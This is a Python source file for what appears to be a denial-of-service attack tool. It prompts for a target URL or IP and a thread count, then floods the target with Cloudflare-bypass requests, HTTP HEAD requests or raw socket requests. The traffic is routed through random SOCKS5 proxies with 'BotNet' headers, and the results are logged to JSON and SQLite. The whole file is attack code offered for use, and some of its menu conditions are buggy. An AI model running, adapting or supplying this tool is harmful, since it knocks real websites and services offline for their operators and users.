import socket
import sys
import os
import time
import cfscrape
import random
import httpx
import socks
import sqlite3
import json
from colorama import Style, Fore, Back, init
from termcolor import colored
from threading import Thread

init()

R = "\033[91;1m"  # Red
G = "\033[92;1m"  # Green
B = "\033[94;1m"  # Blue
Y = "\033[93;1m"  # Yellow
C = "\033[96;1m"  # Cyan
M = "\033[95;1m"  # Magenta
W = "\033[97;1m"  # White
D = "\033[90;1m"  # Grey
S = "\033[0m"     # Reset

sign = "\033[92;1m" + "[" + "\033[94;1m" + "*" + "\033[92;1m" + "]" + "\033[94;1m"
Enter = "\033[94;1m" + "[" + "\033[92;1m" + "+" + "\033[94;1m" + "]" + "\033[92;1m"
ERROR = "\033[93;1m" + "\nX" + " " + "\033[91;1m" + "ERROR\n" + "\033[93;1m" + "╰─> " + "\033[93;1m"
INFO = "\033[93;1m" + "[" + "\033[92;1m" + "INFO" + "\033[93;1m" + "]" + "\033[94;1m"
Information = "\033[93;1m" + "[" + "\033[92;1m" + "Information" + "\033[93;1m" + "]" + "\033[94;1m"
Working = "\033[94;1m" + '[' + "\033[92;1m" + 'Working' + "\033[94;1m" + ']'
NotWorking = "\033[93;1m" + '[' + "\033[91;1m" + 'Not Working' + "\033[93;1m" + ']' + "\033[91;1m"
warning = "\033[93;1m" + "[" + "\033[91;1m" + "WARNING" + "\033[93;1m" + "]" + "\033[91;1m"
Complete = "\033[94;1m" + "[" + "\033[92;1m" + "COMPLETE" + "\033[94;1m" + "]" + "\033[92;1m"
successfully = "\033[93;1m" + "[" + "\033[92;1m" + "successfully" + "\033[93;1m" + "]" + "\033[94;1m"
Failed = "\033[93;1m" + "[" + "\033[91;1m" + "FAILED" + "\033[93;1m" + "]" + "\033[91;1m"
please = "\033[93;1m" + "[" + "\033[91;1m" + "!" + "\033[93;1m" + "]" + "\033[91;1m"
Question = "\033[95;1m" + "[" + "\033[96;1m" + "?" + "\033[95;1m" + "]" + "\033[97;1m"
Help = "\033[97;1m" + "To continue anyway press or click" + "\033[94;1m" + " [" + "\033[92;1m" + "Enter" + "\033[94;1m" + "] " + "\033[97;1m" + "and to stop or exit" + "\033[93;1m" + " [" + "Ctrl" + "\033[97;1m" + " + " + "\033[93;1m" + "C" + "]" + "\033[0m"
other = "\033[95;1m" + "[" + "\033[93;1m" + "~" + "\033[95;1m" + "]" "\033[92;1m"
notice = "\033[94;1m" + "[" + "\033[92;1m" + "notice" + "\033[94;1m" + "]" + "\033[97;1m"
note = "\033[94;1m" + "[" + "\033[92;1m" + "note" + "\033[94;1m" + "]" + "\033[97;1m"
Running = "\033[94;1m" + '[Running]' + "\033[95;1m"
Ready = "\033[95;1m" + "[" + "\033[96;1m" + "Ready" + "\033[95;1m" + "]" + "\033[97;1m"
DONE = "\033[94;1m" + "[" + "\033[92;1m" + "DONE" + "\033[94;1m" + "]" + "\033[97;1m"
Loading = "\033[95;1m" + "[" + "\033[96;1m" + "Loading" + "\033[95;1m" + "]" + "\033[97;1m"
OK = "\033[92;1m" + "[" + "\033[94;1m" + "OK" + "\033[92;1m" + "]" + "\033[94;1m"
Okay = "\033[92;1m" + "[" + "\033[94;1m" + "Okay" + "\033[92;1m" + "]" + "\033[94;1m"
stop = "\033[91;1m" + '[' + "\033[93;1m" + 'stop' + "\033[91;1m" + ']' + "\033[95;1m"
Critical = "\033[95;1m" + "[" + "\033[96;1m" + "Critical" + "\033[95;1m" + "]" + "\033[97;1m"
paused = "\033[94;1m" + "[" + "\033[92;1m" + "paused" + "\033[94;1m" + "]" + "\033[92;1m"
Retrying = "\033[95;1m" + "[" + "\033[96;1m" + "Retrying" + "\033[95;1m" + "]" + "\033[97;1m"
Skip = "\033[95;1m" + "[" + "\033[96;1m" + "Skip" + "\033[95;1m" + "]" + "\033[97;1m"
SCAN = "\033[93;1m" + "[" + "\033[92;1m" + "SCAN" + "\033[93;1m" + "]" + "\033[94;1m"
Chacking = "\033[93;1m" + "[" + "\033[92;1m" + "Chacking" + "\033[93;1m" + "]" + "\033[94;1m"
Hacking = "\033[91;1m" + '[' + "\033[93;1m" + 'Hacking' + "\033[91;1m" + ']' + "\033[95;1m"
security = "\033[94;1m" + "[" + "\033[92;1m" + "security" + "\033[94;1m" + "]" + "\033[97;1m"
AI = "\033[95;1m" + "[" + "\033[96;1m" + "AI" + "\033[95;1m" + "]" + "\033[97;1m"
Press = "\033[91;1m" + "[" + "\033[93;1m" + "Ctrl" + "\033[97;1m" + "+" "\033[93;1m" + "C" + "\033[91;1m" + "\033[91;1m" + "]" + "\033[97;1m"

attacks_data = []

def save_attack_data_to_json(attacks_data):
    with open("attacks.json", "w") as json_file:
        json.dump(attacks_data, json_file)

def save_attack_data_to_db(attacks_data):
    db_conn = sqlite3.connect("attacks.db")
    db_cursor = db_conn.cursor()
    db_cursor.execute("CREATE TABLE IF NOT EXISTS attacks (id INTEGER PRIMARY KEY AUTOINCREMENT, host TEXT, status_code INTEGER)")

    for data in attacks_data:
        db_cursor.execute("INSERT INTO attacks (host, status_code) VALUES (?, ?)", (data["host"], data["status_code"]))

    db_conn.commit()
    db_conn.close()

user = open("BotNet.txt", "r").read().splitlines()
proxy = open("proxy.txt", "r").read().splitlines()

ANIMATION_STEPS = ["◜", "◠", "◝", "◞", "◡", "◟"]
def function():
    time.sleep(0.09)
    os.system('cls' if os.name == 'nt' else 'clear')

def loading():
    try:
        for i in range(1, 50):
            print(ANIMATION_STEPS[i % len(ANIMATION_STEPS)], end='\r', flush=True)
            function()
    except KeyboardInterrupt:
        pass
if __name__ == '__main__':
    loading()

os.system('cls' if os.name == 'nt' else 'clear')
print(fr'''{Y}
       {Y}.---.        .-----------{W}  
      {Y}/     \  __  /    ------{W}    
     {Y}/ /     \(  )/    -----{W}     
    {Y}//////   ' \/ `   ---{W}    ____  ____          ____       _   _   _             _    
   {Y}//// / // :    : ---{W}     |  _ \|  _ \   ___  / ___|     / \ | |_| |_ __ _  ___| | __
  {Y}// /   /  /`    '--{W}       | | | | | | | / {R}_{W} \ \___ \    / _ \| __| __/ _` |/ __| |/ /
 {Y}//          //..\\{W}         | |_| | |_| || {R}(0){W} | ___) |  / ___ \ |_| || (_| | (__|   < 
        {Y}====UU====UU===={W}    |____/|____/  \_{R}^{W}_/ |____/  /_/   \_\__|\__\__,_|\___|_|\_\
            {Y}'//||\\`{W}              
              {Y}''`` {W}''')
    
while True:
    print(rf"""
{D}
             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |{G}[1] {B}cf{D}           |  |  |     |         |      |
     |  |{G}[2] {B}HTTP{D}         |  |  |/----|`---=    |      |
     |  |{G}[3] {B}socks{D}        |  |  |     |         |      |
     |  |                 |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \\,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\\--{{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'
        {W}""")
    
    cmd = input(colored(f'{R}┌─[{M}Mohammed Al-Baqer{Y}@{B}@WSL.IQ{R}]─[{G}Enter number options{R}]\n└──╼ {R}>{Y}>{G}>{B} '))
    
    if cmd == '1' or "cf":
        os.system('cls' if os.name == 'nt' else 'clear')
        print(fr'''

                                       {B}.{W}
   ____ _                   _   _____ {B}/ \{W}                   
  / ___| |  ___   _   _  __| | |  ___|{B}| |{W}  __ _ _ __ ___ 
 | |   | | / {R}_{W} \ | | | |/ _` | | |_   {B}|.|{W} / _` | '__/ _ \
 | |___| || {R}(0){W} || |_| | (_| | |  _|  {B}|.|{W}| (_| | | |  __/
  \____|_| \_{R}^{W}_/  \__,_|\__,_| |_|    {B}|:|{W} \__,_|_|  \___|
                                      {B}|:|{W}                    
                                  {W}~{Y}\===8===/{W}~{R}  
                                       8
                                       0

{Back.RED}{W}  It targets content filtering services that generate huge traffic. {Style.RESET_ALL}''')
        print(1*"\n")
        host = input(f"{Enter} Url For Attack: {Y}")
        num = int(input(f"{Enter} Enter thread: {Y}"))
        print(f"{sign} exit or stop press {Press} to Exit.{W}")
        break

    elif cmd == '2' or 'http' or "HTTP":
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'''{G}                 
 _____ _____ _____ _____ 
|  |  |_   _|_   _|  _  |
|     | | |   | | |   __|
|__|__| |_|   |_| |__|     
                                                                       
         
{Back.RED}{W} Targets a web service to increase traffic. {Style.RESET_ALL}''')
        print(1*"\n")
        host2 = input(f"{Enter} Url For Attack: {Y}")
        num2 = int(input(f"{Enter} Enter thread: {Y}"))
        print(f"{sign} exit or srop press {Press} to Exit.{W}")
        break

    elif cmd == '3' or "socks":
        os.system('cls' if os.name == 'nt' else 'clear')
        print(rf'''{Y}
                      __           
  ______ ____   ____ |  | __ ______
 /  ___// __ \_/ ___\|  |/ //  ___/
 \___ \(  \_\ )  \___|    \ \___ \ 
/____  \\____/ \___  /__|_ \____  \
     \/            \/     \/    \/ 
                                                     
{Back.RED}{W} The Socks protocol aims to increase traffic volume. {Style.RESET_ALL}''')
        print(1*"\n")
        host3 = input(f"{Enter} IP For Attack: {Y}")
        port = int(input(f"{Enter} Port for Attack {Y}Enter Your Custom 4-digit Port {G}[80-9999]: {M}"))
        num3 = int(input(f"{Enter} Enter thread: {Y}"))
        print(f"{sign} exit or stop press {Press} to Exit.{W}")
        break

    else:
        continue

def ddos(si):
    try:
        proxy2 = {
            "all://": "socks5://" + str(random.choice(proxy))
        }
        u = random.choice(user)
        sc = cfscrape.CloudflareScraper()
        cf = sc.get(host, headers={'BotNet': u}, proxies=proxy2)
        print(f"{sign} Send Packet FROME {Y}"+random.choice(proxy)+f"{M} TO {Y}"+host+f"{W}:{G}"+str(cf.status_code))
        attacks_data.append({"host": host, "status_code": cf.status_code})

        save_attack_data_to_json(attacks_data)
        save_attack_data_to_db(attacks_data)

        return True
    except:
        print(f"{ERROR} Not Connect error !{W}")

def http(nurt):
	try:
		proxy3={
			"all://":"socks5://"+str(random.choice(proxy))
			
			}
		with httpx.Client(proxies=proxy3) as client:
			r =client.head(host2,headers={'BotNet':random.choice(user)})
			print(f"{sign} Send Packet OF the response:{W}"+str(r.status_code))
	except:
		print(f"{ERROR} connect time out !{W}")
            
def sock3(xl):
	for n3 in range(0, num3):
		sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((host3,port))
		ag1=random.choice(user)
		data=f"GET / HTTP/1.1\r\nHost:"+host3+"\r\nBotNet:"+ ag1+"\r\n\r\n"
		sock.send(data.encode())
		print(f"{sign} Send Packet with IP{W}:"+"test"+"to the Target:"+host3)

if cmd=="HTTP":
	for z in range(0, num2):
		new_thread2 = Thread(target=http,args=(10,))
		new_thread2.start()
            
elif cmd=="socks":
	new_thread3 = Thread(target=sock3,args=(10,))
	new_thread3.start()
      
else:
	print(f"{ERROR} Not Founds or Loading... {W}")

threads = []
for si in range(0, num):
	t1 = Thread(target=ddos, args=(si,))
	t1.start()
      
	threads.append(t1)
for t1 in threads:
	t1.join()	
      
save_attack_data_to_json(attacks_data)
save_attack_data_to_db(attacks_data)
